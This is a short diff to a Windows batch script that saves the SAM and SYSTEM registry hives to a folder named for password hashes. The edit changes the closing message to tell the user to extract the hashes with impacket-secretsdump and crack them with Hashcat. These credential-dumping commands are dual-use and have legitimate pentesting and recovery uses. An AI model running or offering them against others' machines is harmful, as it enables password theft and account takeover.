@@ -21,7 +21,7 @@ md "%HashPath%\Windows Password Hashes"
 reg save HKLM\SAM "%HashPath%\Windows Password Hashes\SAM.save"
 reg save HKLM\SYSTEM "%HashPath%\Windows Password Hashes\SYSTEM.save"
 echo.
-echo Use impacket-secretsdump in Kali Linux to extract the hashes from "%HashPath%\Windows Password Hashes".
+echo Use impacket-secretsdump in Kali Linux to extract the hashes from "%HashPath%\Windows Password Hashes". You can then use a tool like Hashcat to crack the hash. Press any key to close this batch file.
 goto :Done
 
 :HashPathNotExist
@@ -30,5 +30,5 @@ goto :Start
 
 :Done
 endlocal
-pause
+pause >nul
 exit
